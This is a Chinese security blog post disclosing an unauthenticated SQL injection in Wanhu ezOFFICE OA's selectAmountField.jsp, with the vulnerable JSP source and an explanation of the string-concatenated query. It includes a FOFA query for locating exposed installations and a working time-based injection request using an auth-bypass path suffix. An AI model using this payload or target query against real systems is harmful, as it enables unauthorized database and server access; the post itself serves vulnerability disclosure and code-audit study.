---
title: "万户OA selectAmountField.jsp SQL注入漏洞"
source: https://mrxn.net/jswz/defaultroot-ezOFFICE-selectAmountField-sqli.html
asset_dir: assets/万户oa-selectamountfield.jsp-sql注入漏洞
---

# 万户OA selectAmountField.jsp SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/1/7 19:41
- 1556浏览
- [0评论](#comment)
- 25分钟阅读

深入探索

Nessus

漏洞预警服务

编码转换工具

---

# 0x01 产品简介

万户OA [ezoffice](https://mrxn.net/tag/ezoffice "ezoffice") 是万户网络协同办公产品多年来一直将主要精力致力于中高端市场的一款OA协同办公[软件](#)产品，统一的基础管理平台，实现用户数据统一管理、权限统一分配、身份统一认证。统一规划门户网站群和协同办公平台，将外网信息维护、客户服务、互动交流和日常工作紧密结合起来，有效提高工作效率。

SQL注入防护

# 0x02 漏洞概述

万户 ezOFFICE selectAmountField.jsp 接口存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞，未授权的攻击者可利用此[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")获取数据库权限，深入利用可获取服务器权限。

# 0x03 复现环境

本地环境 OR FOFA：app="ezOFFICE协同管理平台" || app="万户ezOFFICE协同管理平台" || app="万户网络-ezOFFICE"

# 漏洞复现

```
GET /defaultroot/platform/custom/custom_database/dropdownselect/selectAmountField.jsp;.js?tableId=1+and+1=dbms_pipe.receive_message('RDS',5)-- HTTP/1.1
Host: 192.168.22.187:7001
```

成功延时 5 秒  
[[![万户OA selectAmountField.jsp SQL注入漏洞](images/img-001-a1daa47a4abb.png)](https://mrxn.net/content/uploadfile/202501/35c51736250215.png)](https://mrxn.net/content/uploadfile/202501/35c51736250215.png)

# 漏洞分析

> 关于鉴权绕过，参考这篇文章：[万户 ezOFFICE ajax\_checkUserNum.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-ajax_checkUserNum-sqli.html)
>
> 代码安全审计

platform/custom/custom\_[database](#)/dropdownselect/selectAmountField.jsp 代码如下，非常简单！

深入探索

Web安全课程

漏洞扫描服务

VPN服务

```
<%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ include file="/public/include/init.jsp"%>
<%@ page import="com.whir.ezoffice.customdb.customdb.bd.CustomDatabaseBD" %>
<%
String tableId = request.getParameter("tableId");
String index = request.getParameter("index");
String val = request.getParameter("val");
if (val == null || "null".equals(val)) {
    val = "";
}

java.sql.Connection conn = null;
java.sql.Statement stmt = null;
java.util.List list = new java.util.ArrayList();
Object[] obj;
try {
    conn = new com.whir.common.util.DataSourceBase().getDataSource().getConnection();
    stmt = conn.createStatement();
    java.sql.ResultSet rs = stmt.executeQuery("select field_name,field_desname from tfield where (field_show=301 or field_show=203 or field_show=606) and field_table="+ tableId);
    while (rs.next()) {
        obj = new String[2];
        obj[0] = rs.getString(1);
        obj[1] = rs.getString(2);
        list.add(obj);
    }
    rs.close();
    stmt.close();
} catch (Exception ex) {    
} finally {
    if (conn != null) {
        conn.close();
    }
}
%>
    <select onchange="setSelectObj(this,'<%=index%>');" class="selectlist" style="width:50%;">
        <option value=""></option>
        <%
        if(list.size()>0){
          for(int i=0;i<list.size();i++){   
            obj=(Object[])list.get(i);  
        %>
          <option value="<%=obj[0].toString()%>" <%if(val.trim().equals(obj[0].toString().trim())){out.print("selected");}%>><%=obj[1].toString()%></option>
        <%}
        }%>
    </select>
```

`tableId` 通过 `request.getParameter` 获取后直接拼接进 `SQL` 语句，然后执行，造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞，就是这么朴实无华！

漏洞修复方案

# 最后

其他万户OA 相关漏洞  
[万户 ezOFFICE selectAmountField.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-selectAmountField-sqli.html)  
[万户OA系列漏洞](https://mrxn.net/tag/ezoffice)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#ezOFFICE](https://mrxn.net/tag/ezOFFICE)

---

文章目录

- [1.0x01 产品简介](#toc-1-)
- [2.0x02 漏洞概述](#toc-2-)
- [3.0x03 复现环境](#toc-3-)
- [4.漏洞复现](#toc-4-)
- [5.漏洞分析](#toc-5-)
- [6.最后](#toc-6-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALQUlEQVR4Aeyd3XrbOAxEffb937lbZHoUESJlpT+xL+Rv0dEMBiBD0G2cXOx/j8fjx+/Ej/ayh7JcVBfVO/b8M97rZ/xZD/Mde6+el+vrXP0rWAP56b//e5cT2Abyc7qPK/Fs48ADONiADx2CGvqaXYf49UF491VeTSytQr5CGHtCeNXuA6LDiKu++9qz5339NpC9eD+/7gQOA4Fx+hB+dYv9Jqzq9MF5f32rPjO910DWUIeR2wOidw6jbh99zxBSDyPO6g4DmZlu7ftO4K8PBMZb0G+THOLrXypEhznqt4+8UA3GWvXy7APi22u/87zq/zu9/vpAfmcTd83nCfzxQCC3rN+SFYe53y1Z19G8COkDR9QjwuhRdw25uNLNi1d9+q/gHw/kyiK35/oJHAbi1DuuWuqD3MIP/qM+/K8qRr37IX0gOLo/mXUz1GVOvkJ9ImRtuWg9JC9/htZ3nNUdBjIz3dr3ncA2EMjU4Rz71iB+pw/h+mDk6iLM872f3DoRUg8oLfFZj1Uh8PFThq/WQ+rgHPfrbgPZi/fz607gP6f+VexbhtwCdQi3r7oIya+4+qq+58unJkLWqFwFhJsXK1cB53n9Ipz7q+dX436HeLpvgoeBQKYOwb5PiA7BnvdGqMPcZ16/qA6pg6C6CNHhiHp6T3URUisXn9XpE/VD+kHQPIxcfYaHgcxMt/Z9J7ANBK5N0dsg9q1C+pgXIXr3y2Get17fipeu5xmWt0IfZO3SKroOyUOwPPvQ3xFGf8/P+DaQWfLWvv8E/oNM0aWdvLwjjP6e7/UQf9flMObVe1/g47PASge233h2z4r3tSB7gaB13acO8UFQvSOMeQiH4N5/v0P2p/EGz4fPIe6p3wrINLv+Vb/1MO8H0e0rWicX1QthXgvRy1Nh7QrLsw9I/cp/VYfnfe53yNXT/CbfYSCQKcKI7geiy0WIDsFnujdQn6guQvpBUN8Z9tqVF9JTvz6ILu8I83zvY91KNw/pBzwOA3ncr5eewPK7rD5Vueiu5VcRchush3AIdl1uf5j7AK0bWiOaAIbv2GDk3d+5fdTFrstX2OvKd79D6hTeKLbvstwTjLdFXYQxD+EQ1CfCqM9uRXnVIX555WZhfoYz/16b1ey1vbee4dqeylsBox9G7lpw1O93SJ3gG8U2EMi03BuEO031zrsOqVMXIToE1UWIvuqvr+chdfCJeiHain/oP/+Ac59rwtwHo/6z5el/EH/vC9zfZT3e7HX4Lmu1P8hUYUSn3OsgvlVef89D6iD4LG+fQr0w1sLIy7sP6/ba7FmfqGfFIevqE7tfvXD7K6vIHa8/gW0gZ1Pbb7P74Ou3oPpB6iDY+5ZnHxCf2swP8cxy1p0hjPUQ3msguutAePeZ7/oZ3wZyZrpz33cCh88hz5aG8Tb0WyCH+CCobv/OVzqM9b1OXmgPEVJ7let7hrVWhb56roCsByPqg+grXvr9DqlTeKNYDqQmXuFe63kWkKnDiL0OkrcHzLl1zxBSP/NBcq6lRw7X8taJkDr5Cl3HfOfqM1wOZGa+tX9/AofPIU4Tchsg6FYgHILq1nWE+NRh5L0eklcX4VwHtG6/Wwc+fqq7WhuS3wqfPPQ+MNabfzweH506/xCf/HG/Q54c0Henl99lOV3Rjck7mof5rYFRh3AY0T4dXU9dPkNIT3Mw8t5DLlon72heNA9ZB4LqYvfL93i/QzytN8HDQGCcLoTDOfr1OG05pK7r5le6+Y6QfrBGayCeZ2tAfKs6GPPdB9fyMPfZr/AwkBLveN0JXB6It6yjW4f59PVD8vJepy6aFyH1cn0z7B5ILQTNi/aAeV4fJA9B68zLO5oXIfWdA/fvQx5v9nr6OaTvF8bp9rwc4oOgt8a8eFVf+SD9AVtuCHx8DtmEXw8w13+lN4DRt9rDVvDrAca6X/L2+UgOR9/lv7JscuO/PYF7IP/2fL/c/fDBEPI2qrdnRe9YWsVVvfvk1aNCLkLWl5enAka958ujJpZW0XlpFZCeEOy+FVeHsU69elfIRYi/chXq9Wzc7xBP5U3wMBAnBZmm+4RwGLHn5WLvB1+rh/jtY1+IDkfUI/ZaddG8qN4RspZ690PyMGL3Q/K9vnyHgZR4x+tO4DAQGKfXpyhfIYz1/UuzTh1Gf893bt1MVxMhvWHE3gOSV3+G9l/5ev4Zh6wP3B8MH2/2Wn4wdJ+Q6TllCIegvqsIqbOfdRAdguoiRLcORl76ylu5CvMipIdchOhVU6EuQvLyjpB81VZAOIzY64of/soq8Y7XncA2EDifHiRfE69wyxAdgl2Xi1VbIRdLq5DD2K9yFebPsHwV3VNahXo97wPGNWHke289r/qor7BqK8zXs7ENxOSNrz2BbSBOSITcDrnbhFHveX0rHVIPQf0w8pUOow/C4Yi9Bxw98Knpv7p3SK11MHJ1sfeF+OETt4FYdONrT2D7WRZ8TgnYdgV8/Ajb6YoQHYLqW+HiYeXruly0nXyGekQY9zarKU3/n2L1qrAPjOtDuHmxaoz7HeKpvAlun0OckOj+OodMWV3UL0J8ENQHI1/pEB/McbaOvUQ9Ioy91DtCfOowcvuLkDwErRNhrpvf4/0O2Z/GGzxvA4FMEYLuDcIh6K0w39F8x+6TQ/p2vqpX1y8vhLGXHrE8FfKOlTuL7of5evbQ3zmkTh3CgftnWY83e23vkL4vpyeah89pAspPERi+W7Og95dD/PpEmOuVt7aeK+SQGgh2XV41FRBfPVdAuD4YeXkqzNfzPiB+te6TFy4HYvGN33sC2+cQl60pVcjhfLow5iEcgvapnhUw6jBy/SIkX7UVXZefYdXtA9LTGhi5XvMixGce5hxGXX/vA/HBJ97vEE/pTfAwEMi0VvuDMd+nLxdh9NsXouvrurzn5SKkDzxHe3bsvcxDespXCKPPfvphzKt3X+mHgZR4x+tOYDkQOJ9qny6MfgjvPr/Urss7QvpY13HvP8uVz3w97wOurWE9jH57mRdh7tMPY77qlgOp5B3ffwKHgTi9jm4NxqnCyPWJkDwEu77i6u4DUg8j6ivUK5a2D5jXrvzWQurk4rO6nof0gWDvU/7DQDTd+JoTOAwEMj0Iuq2a3j7UO8JYZ35fu3+G+NUg3DoYufpXEMYefS0Y8/bWt0J9oj652PXOIesD98+yHm/22n4f0vfVp2geMk25PlG9I4x1q/yqz0qH9IUjuoa1IsRrfo1jBlIHQbMQDueoX3Q/ezz8laX5xtecwPazrP2U6nm1ncpVmIfcCnnlZmEezv36OsJ53X7NXiuHsYe6aA+ID4Lmxe7runnRvAhjXwgH7n9DHm/22v4Ngc8pwfPnP/064HyNq/3hs8/VmtXNtd68CFnDvGheLsLcb946OPruf0M8pTfBbSBO7Rn2feuHTBuC+iBcn3rn6h31iWf5npND9tB57wnxwYjdZ58VftW/77MNZC/ez687gcNAYLwdEP7VLULqvC0Qbh8YuT4RxjzMOUSHT7y6hj7X7GheNA9ZS12E6DCi+St4GMiVotvz707gjwcCuQ1u0VskX2H3wXkf/R33/c2pda4OWQuCXZf3eohfHUZunaiv8xUv/Y8HUk3u+Hsn8M8HArlFbtlbA6NuXoRrefsVwnmNvcu7j65D+sCI1ugXIT65Phh18x31F/7zgfTFb35+AoeB1JRmsWrTvfq6Ljcvdh3GWwXhMKL1ZwipcQ0Ih6C1MHJ16+QixG++o74VQupn+cNAZqZb+74T2AYCmRqc42prMNbpg+jyjnCef3b7IPWw/p8TQzz2cg8w1/VB8t0vF2H0qdtHhNEH4fCJ20BscuNrT+AeyGvP/7D6/wAAAP//K9bLLgAAAAZJREFUAwBD7JXRYtkpZAAAAABJRU5ErkJggg==)

手机扫码阅读
